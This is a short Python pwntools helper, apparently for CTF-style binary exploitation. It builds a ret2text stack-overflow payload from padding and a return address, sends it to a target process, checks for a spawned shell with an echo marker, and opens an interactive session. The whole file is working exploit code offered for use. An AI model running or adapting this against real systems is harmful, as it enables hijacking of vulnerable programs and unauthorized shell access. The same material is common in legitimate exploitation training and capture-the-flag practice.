from pwn import *

def loop2text(padding, return_addr, io=None):
    
    if isinstance(padding, int):
        payload = b'a' * padding
    elif isinstance(padding, bytes):
        payload = padding
    else:
        raise ValueError("Padding must be int or bytes or be vaild")
    
    payload += p64(return_addr)
    
    if io:
        print(f"[*] Sending payload with length: {len(payload)}")
        print(f"[*] Return Address: {hex(return_addr)}")
        io.sendline(payload)
        
        # 验证是否成功拿到 Shell
        try:
            io.sendline(b'echo loopwn_check')
            # 设置 1 秒超时，尝试读取回显
            output = io.recvuntil(b'loopwn_check', timeout=1)
            
            if b'loopwn_check' in output:
                print("[+] Congratulation! You got a shell!")
            else:
                print("[-] Failed to get a shell (Timeout).")
        except EOFError:
            print("[-] Failed to get a shell (EOF/Crash).")
        except Exception as e:
            print(f"[-] Error checking shell: {e}")

        io.interactive()
        
    return payload
